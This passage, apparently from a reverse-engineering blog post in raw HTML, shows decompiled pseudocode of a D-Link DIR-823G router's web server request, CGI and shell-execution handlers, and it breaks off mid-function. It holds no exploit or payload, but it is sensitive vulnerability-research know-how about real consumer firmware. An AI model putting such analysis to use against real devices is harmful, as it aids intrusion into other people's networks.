class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">websFormHandler</span><span class="params">(</span></span><br><span class="line"><span class="params">        <span class="type">int</span> a1,</span></span><br><span class="line"><span class="params">        <span class="type">int</span> a2,</span></span><br><span class="line"><span class="params">        <span class="type">int</span> a3,</span></span><br><span class="line"><span class="params">        <span class="type">int</span> a4,</span></span><br><span class="line"><span class="params">        <span class="type">int</span> a5,</span></span><br><span class="line"><span class="params">        <span class="type">int</span> a6,</span></span><br><span class="line"><span class="params">        <span class="type">int</span> a7,</span></span><br><span class="line"><span class="params">        <span class="type">int</span> a8,</span></span><br><span class="line"><span class="params">        <span class="type">int</span> a9,</span></span><br><span class="line"><span class="params">        <span class="type">int</span> a10,</span></span><br><span class="line"><span class="params">        <span class="type">int</span> a11)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">void</span> (__fastcall *v12)(<span class="type">int</span>, <span class="type">const</span> <span class="type">char</span> *, <span class="type">int</span>); <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// [sp+1Ch] [+1Ch]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v14; <span class="comment">// [sp+1Ch] [+1Ch]</span></span><br><span class="line">  _BYTE *v15; <span class="comment">// [sp+20h] [+20h]</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// [sp+24h] [+24h]</span></span><br><span class="line">  <span class="type">char</span> v17; <span class="comment">// [sp+28h] [+28h] BYREF</span></span><br><span class="line">  _BYTE v18[<span class="number">3</span>]; <span class="comment">// [sp+29h] [+29h] BYREF</span></span><br><span class="line"></span><br><span class="line">  ++dword_58AF74;</span><br><span class="line">  <span class="built_in">strncpy</span>(&amp;v17, a10, <span class="number">254</span>);</span><br><span class="line">  v13 = <span class="built_in">strchr</span>(v18, <span class="string">'/'</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v13 )</span><br><span class="line">  {</span><br><span class="line">    v14 = (<span class="type">const</span> <span class="type">char</span> *)(v13 + <span class="number">1</span>);</span><br><span class="line">    v15 = (_BYTE *)<span class="built_in">strchr</span>(v14, <span class="string">'/'</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v15 )</span><br><span class="line">      *v15 = <span class="number">0</span>;</span><br><span class="line">    v16 = sub_412360(dword_588AA0, v14);</span><br><span class="line">    <span class="keyword">if</span> ( v16 )</span><br><span class="line">    {</span><br><span class="line">      v12 = *(<span class="type">void</span> (__fastcall **)(<span class="type">int</span>, <span class="type">const</span> <span class="type">char</span> *, <span class="type">int</span>))(v16 + <span class="number">18</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v12 )</span><br><span class="line">        v12(a1, v14, a11);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">      sub_41F454(a1, <span class="number">200</span>, <span class="string">"Form %s is not defined"</span>, v14);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    sub_41F454(a1, <span class="number">200</span>, <span class="string">"Missing form name"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>Call the <code>sub_412360</code> function to find the form entered by user, if find the form, call the corresponding handler function.</p><p>continue to analyze <code>websCgiHandler</code> function.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">websCgiHandler</span><span class="params">(</span></span><br><span class="line"><span class="params">        _DWORD *a1,</span></span><br><span class="line"><span class="params">        <span class="type">int</span> a2,</span></span><br><span class="line"><span class="params">        <span class="type">int</span> a3,</span></span><br><span class="line"><span class="params">        <span class="type">int</span> a4,</span></span><br><span class="line"><span class="params">        <span class="type">int</span> a5,</span></span><br><span class="line"><span class="params">        <span class="type">int</span> a6,</span></span><br><span class="line"><span class="params">        <span class="type">int</span> a7,</span></span><br><span class="line"><span class="params">        <span class="type">int</span> a8,</span></span><br><span class="line"><span class="params">        <span class="type">int</span> a9,</span></span><br><span class="line"><span class="params">        <span class="type">int</span> a10,</span></span><br><span class="line"><span class="params">        <span class="type">int</span> a11)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// [sp+24h] [+24h]</span></span><br><span class="line">  <span class="type">int</span> v15; <span class="comment">// [sp+28h] [+28h]</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// [sp+2Ch] [+2Ch]</span></span><br><span class="line">  <span class="type">int</span> v17; <span class="comment">// [sp+30h] [+30h]</span></span><br><span class="line">  <span class="type">int</span> v18; <span class="comment">// [sp+30h] [+30h]</span></span><br><span class="line">  _DWORD *k; <span class="comment">// [sp+34h] [+34h]</span></span><br><span class="line">  <span class="type">int</span> v20; <span class="comment">// [sp+38h] [+38h]</span></span><br><span class="line">  _DWORD *v21; <span class="comment">// [sp+3Ch] [+3Ch]</span></span><br><span class="line">  <span class="type">int</span> v22; <span class="comment">// [sp+40h] [+40h]</span></span><br><span class="line">  _BYTE *v23; <span class="comment">// [sp+44h] [+44h]</span></span><br><span class="line">  _BYTE *v24; <span class="comment">// [sp+44h] [+44h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [sp+44h] [+44h]</span></span><br><span class="line">  <span class="type">int</span> v26; <span class="comment">// [sp+48h] [+48h]</span></span><br><span class="line">  <span class="type">int</span> v27; <span class="comment">// [sp+4Ch] [+4Ch]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [sp+50h] [+50h]</span></span><br><span class="line">  _DWORD *v29; <span class="comment">// [sp+54h] [+54h]</span></span><br><span class="line">  <span class="type">char</span> v30; <span class="comment">// [sp+58h] [+58h] BYREF</span></span><br><span class="line">  _BYTE v31[<span class="number">3</span>]; <span class="comment">// [sp+59h] [+59h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v32[<span class="number">256</span>]; <span class="comment">// [sp+158h] [+158h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v33; <span class="comment">// [sp+258h] [+258h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v34[<span class="number">20</span>]; <span class="comment">// [sp+260h] [+260h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v35; <span class="comment">// [sp+274h] [+274h]</span></span><br><span class="line"></span><br><span class="line">  ++dword_58AF78;</span><br><span class="line">  <span class="built_in">strncpy</span>(&amp;v30, a10, <span class="number">254</span>);</span><br><span class="line">  v22 = <span class="built_in">strchr</span>(v31, <span class="string">'/'</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v22 )</span><br><span class="line">  {</span><br><span class="line">    v23 = (_BYTE *)<span class="built_in">strchr</span>(v22 + <span class="number">1</span>, <span class="string">'/'</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v23 )</span><br><span class="line">      *v23 = <span class="number">0</span>;</span><br><span class="line">    v12 = sub_40539C();</span><br><span class="line">    sub_40BBEC(&amp;v33, <span class="number">254</span>, <span class="string">"%s/%s/%s"</span>, v12);</span><br><span class="line">    <span class="keyword">if</span> ( !stat(v33, v34) &amp;&amp; (v35 &amp; <span class="number">0x8000</span>) != <span class="number">0</span> )</span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">if</span> ( access(v33, <span class="number">1</span>) )</span><br><span class="line">      {</span><br><span class="line">        sub_41F454(a1, <span class="number">200</span>, <span class="string">"CGI process file is not executable"</span>);</span><br><span class="line">        sub_403588(v33);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">      }</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      {</span><br><span class="line">        getcwd(v32, <span class="number">254</span>);</span><br><span class="line">        v24 = (_BYTE *)<span class="built_in">strrchr</span>(v33, <span class="string">'/'</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v24 )</span><br><span class="line">        {</span><br><span class="line">          *v24 = <span class="number">0</span>;</span><br><span class="line">          chdir(v33);</span><br><span class="line">          *v24 = <span class="string">'/'</span>;</span><br><span class="line">        }</span><br><span class="line">        v15 = <span class="number">10</span>;</span><br><span class="line">        v21 = (_DWORD *)sub_4032A8(<span class="number">40</span>);</span><br><span class="line">        *v21 = v33;</span><br><span class="line">        v17 = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> ( !<span class="built_in">strchr</span>(a11, <span class="string">'='</span>) )</span><br><span class="line">        {</span><br><span class="line">          v13 = <span class="built_in">strlen</span>(a11);</span><br><span class="line">          sub_41F8A8(a11, a11, v13);</span><br><span class="line">          <span class="keyword">for</span> ( i = strtok(a11, <span class="string">" "</span>); i; i = strtok(<span class="number">0</span>, <span class="string">" "</span>) )</span><br><span class="line">          {</span><br><span class="line">            v21[v17++] = i;</span><br><span class="line">            <span class="keyword">if</span> ( v17 &gt;= v15 )</span><br><span class="line">            {</span><br><span class="line">              v15 *= <span class="number">2</span>;</span><br><span class="line">              v21 = (_DWORD *)sub_403754(v21, <span class="number">4</span> * v15);</span><br><span class="line">            }</span><br><span class="line">          }</span><br><span class="line">        }</span><br><span class="line">        v21[v17] = <span class="number">0</span>;</span><br><span class="line">        v16 = <span class="number">64</span>;</span><br><span class="line">        v20 = sub_4032A8(<span class="number">256</span>);</span><br><span class="line">        sub_40BBEC(v20, <span class="number">254</span>, <span class="string">"%s=%s"</span>, <span class="string">"PATH_TRANSLATED"</span>);</span><br><span class="line">        sub_40BBEC(v20 + <span class="number">4</span>, <span class="number">254</span>, <span class="string">"%s=%s/%s"</span>, <span class="string">"SCRIPT_NAME"</span>);</span><br><span class="line">        sub_40BBEC(v20 + <span class="number">8</span>, <span class="number">254</span>, <span class="string">"%s=%s"</span>, <span class="string">"REMOTE_USER"</span>);</span><br><span class="line">        sub_40BBEC(v20 + <span class="number">12</span>, <span class="number">254</span>, <span class="string">"%s=%s"</span>, <span class="string">"AUTH_TYPE"</span>);</span><br><span class="line">        v18 = <span class="number">4</span>;</span><br><span class="line">        <span class="keyword">for</span> ( j = sub_41211C(a1[<span class="number">8</span>]); j; j = sub_412230(a1[<span class="number">8</span>]) )</span><br><span class="line">        {</span><br><span class="line">          <span class="keyword">if</span> ( *(_BYTE *)(j + <span class="number">30</span>) )</span><br><span class="line">          {</span><br><span class="line">            <span class="keyword">if</span> ( *(_DWORD *)(j + <span class="number">26</span>) == <span class="number">10</span> )</span><br><span class="line">            {</span><br><span class="line">              <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(*(_DWORD *)(j + <span class="number">4</span>), <span class="string">"REMOTE_HOST"</span>) )</span><br><span class="line">              {</span><br><span class="line">                <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(*(_DWORD *)(j + <span class="number">4</span>), <span class="string">"HTTP_AUTHORIZATION"</span>) )</span><br><span class="line">                {</span><br><span class="line">                  sub_40BBEC(v20 + <span class="number">4</span> * v18++, <span class="number">254</span>, <span class="string">"%s=%s"</span>, *(_DWORD *)(j + <span class="number">4</span>));</span><br><span class="line">                  <span class="keyword">if</span> ( v18 &gt;= v16 )</span><br><span class="line">                  {</span><br><span class="line">                    v16 *= <span class="number">2</span>;</span><br><span class="line">                    v20 = sub_403754(v20, <span class="number">4</span> * v16);</span><br><span class="line">                  }</span><br><span class="line">                }</span><br><span class="line">              }</span><br><span class="line">            }</span><br><span class="line">          }</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">if</span> ( (a1[<span class="number">62</span>] &amp; <span class="number">0x80000</span>) != <span class="number">0</span> )</span><br><span class="line">          sub_40BBEC(v20 + <span class="number">4</span> * v18++, <span class="number">254</span>, <span class="string">"%s=%s"</span>, <span class="string">"UPLOAD_FILENAME"</span>);</span><br><span class="line">        *(_DWORD *)(v20 + <span class="number">4</span> * v18) = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( !a1[<span class="number">66</span>] )</span><br><span class="line">          a1[<span class="number">66</span>] = sub_42464C(a1);</span><br><span class="line">        v27 = a1[<span class="number">66</span>];</span><br><span class="line">        v26 = sub_42464C(a1);</span><br><span class="line">        v14 = sub_4246B4(v33, v21, v20, v27);</span><br><span class="line">        <span class="keyword">if</span> ( v14 == <span class="number">-1</span> )</span><br><span class="line">        {</span><br><span class="line">          sub_41F454(a1, <span class="number">200</span>, <span class="string">"failed to spawn CGI task"</span>);</span><br><span class="line">          <span class="keyword">for</span> ( k = (_DWORD *)v20; *k; ++k )</span><br><span class="line">            sub_403680(*k);</span><br><span class="line">          sub_403680(v33);</span><br><span class="line">          sub_403680(v21);</span><br><span class="line">          sub_403680(v20);</span><br><span class="line">          sub_403680(v26);</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        {</span><br><span class="line">          v29 = *(_DWORD **)(dword_589980 + <span class="number">4</span> * sub_40AF88(&amp;dword_589980, &amp;dword_589984, <span class="number">32</span>));</span><br><span class="line">          v29[<span class="number">6</span>] = v14;</span><br><span class="line">          v29[<span class="number">1</span>] = v27;</span><br><span class="line">          v29[<span class="number">2</span>] = v26;</span><br><span class="line">          v29[<span class="number">3</span>] = v33;</span><br><span class="line">          v29[<span class="number">4</span>] = v21;</span><br><span class="line">          v29[<span class="number">5</span>] = v20;</span><br><span class="line">          *v29 = a1;</span><br><span class="line">          v29[<span class="number">7</span>] = <span class="number">0</span>;</span><br><span class="line">          sub_41ED14(a1);</span><br><span class="line">        }</span><br><span class="line">        chdir(v32);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">      sub_41F454(a1, <span class="number">200</span>, <span class="string">"CGI process file does not exist"</span>);</span><br><span class="line">      sub_403588(v33);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    sub_41F454(a1, <span class="number">200</span>, <span class="string">"Missing CGI name"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>Parsing the CGI name from the requested url, and check if this file exists.</p><p>If it exists</p><ul><li>then fork a child process to execute the cgi file.</li></ul><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_4246B4</span><span class="params">(<span class="type">int</span> a1, _DWORD *a2, <span class="type">int</span> a3, <span class="type">int</span> a4, <span class="type">int</span> a5, <span class="type">int</span> a6, <span class="type">int</span> a7, <span class="type">int</span> a8, <span class="type">int</span> a9)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// $a1</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// $a2</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// [sp+18h] [+18h]</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// [sp+1Ch] [+1Ch]</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// [sp+20h] [+20h]</span></span><br><span class="line">  <span class="type">int</span> v15; <span class="comment">// [sp+24h] [+24h]</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// [sp+28h] [+28h]</span></span><br><span class="line"></span><br><span class="line">  v12 = <span class="number">-1</span>;</span><br><span class="line">  v13 = <span class="number">-1</span>;</span><br><span class="line">  v14 = <span class="number">-1</span>;</span><br><span class="line">  v15 = <span class="number">-1</span>;</span><br><span class="line">  v16 = open(a4, <span class="number">258</span>, <span class="number">438</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v16 &gt;= <span class="number">0</span> )</span><br><span class="line">  {</span><br><span class="line">    v15 = open(a9, <span class="number">258</span>, <span class="number">438</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v15 &gt;= <span class="number">0</span> )</span><br><span class="line">    {</span><br><span class="line">      v14 = dup(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v14 != <span class="number">-1</span> )</span><br><span class="line">      {</span><br><span class="line">        v13 = dup(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v13 != <span class="number">-1</span> &amp;&amp; dup2(v16, <span class="number">0</span>) != <span class="number">-1</span> &amp;&amp; dup2(v15, <span class="number">1</span>) != <span class="number">-1</span> )</span><br><span class="line">        {</span><br><span class="line">          v12 = fork();</span><br><span class="line">          <span class="keyword">if</span> ( !v12 )</span><br><span class="line">          {</span><br><span class="line">            <span class="keyword">if</span> ( <span class="built_in">strstr</span>(a1, <span class="string">"GetDownLoadSyslog.sh"</span>) || <span class="built_in">strstr</span>(a1, <span class="string">"ExportSettings.sh"</span>) )</span><br><span class="line">            {</span><br><span class="line">              a2[<span class="number">1</span>] = <span class="string">"D-Link"</span>;</span><br><span class="line">              a2[<span class="number">2</span>] = <span class="string">"DIR-823G"</span>;</span><br><span class="line">              a2[<span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">if</span> ( execve(a1, a2, a3) == <span class="number">-1</span> )</span><br><span class="line">              <span class="built_in">puts</span>(<span class="string">"content-type: text/html\\n\\nExecution of cgi process failed"</span>, v9, v10);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">          }</span><br><span class="line">        }</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">if</span> ( v13 &gt;= <span class="number">0</span> )</span><br><span class="line">  {</span><br><span class="line">    dup2(v13, <span class="number">1</span>);</span><br><span class="line">    close(v13);</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">if</span> ( v14 &gt;= <span class="number">0</span> )</span><br><span class="line">  {</span><br><span class="line">    dup2(v14, <span class="number">0</span>);</span><br><span class="line">    close(v14);</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">if</span> ( v15 &gt;= <span class="number">0</span> )</span><br><span class="line">    close(v15);</span><br><span class="line">  <span class="keyword">if</span> ( v16 &gt;= <span class="number">0</span> )</span><br><span class="line">    close(v16);</span><br><span class="line">  <span class="keyword">return</span> v12;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>If it does not exists</p><ul><li>it will return an error</li></ul><p>Finally, analyze the <code>websExcuteShellHandler</code> function</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_4234CC</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// $a1</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// $a2</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// $a1</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// $a2</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// $a1</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// $a2</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v9; <span class="comment">// [sp+1Ch] [+1Ch]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [sp+20h] [+20h]</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [sp+24h] [+24h]</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// [sp+28h] [+28h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [sp+2Ch] [+2Ch]</span></span><br><span class="line">  <span class="type">char</span> v14[<span class="number">104</span>]; <span class="comment">// [sp+30h] [+30h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v12 = <span class="number">0</span>;</span><br><span class="line">  v11 = <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">strcpy</span>(</span><br><span class="line">    v14,</span><br><span class="line">    <span class="string">"HTTP/1.0 200 OK\\r\\nContent-Type: text/html; charset=utf-8\\r\\nConnection: close\\r\\nCache-Control: private\\r\\n\\r\\n"</span>);</span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  v9 = (<span class="type">const</span> <span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">10240</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v9 )</span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">memset</span>(v9, <span class="number">0</span>, <span class="number">10240</span>);</span><br><span class="line">    v10 = <span class="built_in">malloc</span>(<span class="number">51200</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v10 )</span><br><span class="line">    {</span><br><span class="line">      <span class="built_in">memset</span>(v10, <span class="number">0</span>, <span class="number">51200</span>);</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">128</span>; ++i )</span><br><span class="line">      {</span><br><span class="line">        <span class="keyword">if</span> ( *(_DWORD *)(a1 + <span class="number">8</span> * (i + <span class="number">36</span>)) &amp;&amp; *(_DWORD *)(a1 + <span class="number">8</span> * (i + <span class="number">36</span>) + <span class="number">4</span>) )</span><br><span class="line">        {</span><br><span class="line">          <span class="built_in">memset</span>(v9, <span class="number">0</span>, <span class="number">10240</span>);</span><br><span class="line">          <span class="built_in">strcpy</span>(v9, *(_DWORD *)(a1 + <span class="number">8</span> * (i + <span class="number">36</span>)));</span><br><span class="line">          <span class="keyword">if</span> ( sub_4233B0(v9) )</span><br><span class="line">          {</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"ParseCMD error cmdlines:%s\\n"</span>, v9);</span><br><span class="line">            v11 = <span class="number">-1</span>;</span><br><span class="line">            <span class="keyword">goto</span> LABEL_18;</span><br><span class="line">          }</span><br><span class="line">          <span class="keyword">if</span> ( <span class="built_in">strstr</span>(v9, <span class="string">"FillMacCloneMac"</span>) )</span><br><span class="line">          {</span><br><span class="line">            <span class="built_in">strcat</span>(v9, <span class="string">" 